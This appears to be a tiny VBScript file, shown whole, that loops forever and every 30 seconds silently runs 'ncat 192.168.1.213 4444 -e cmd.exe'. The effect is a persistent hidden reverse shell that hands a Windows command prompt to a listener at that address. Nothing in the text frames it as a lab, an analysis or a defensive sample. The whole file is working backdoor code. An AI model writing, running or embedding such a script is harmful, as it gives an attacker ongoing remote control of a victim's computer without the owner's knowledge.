Do While True
	Set oShell = CreateObject("Wscript.Shell")
	oShell.run "ncat 192.168.1.213 4444 -e cmd.exe", 0, True
	WScript.Sleep 30000
Loop
